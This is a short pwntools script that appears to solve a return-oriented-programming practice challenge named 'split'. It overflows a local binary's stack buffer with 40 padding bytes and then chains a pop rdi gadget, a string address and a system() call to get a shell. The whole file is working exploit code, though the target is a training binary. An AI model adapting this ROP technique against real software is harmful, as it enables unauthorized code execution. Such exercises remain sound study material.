from pwn import *

context.bits = 64
pop_rdi = p64(0x4007c3)
usefulString = p64(0x601060)
system = p64(0x40074b)
payload = b'A' * 40 + pop_rdi + usefulString + system
p = process("./split")
p.send(payload)
p.interactive()
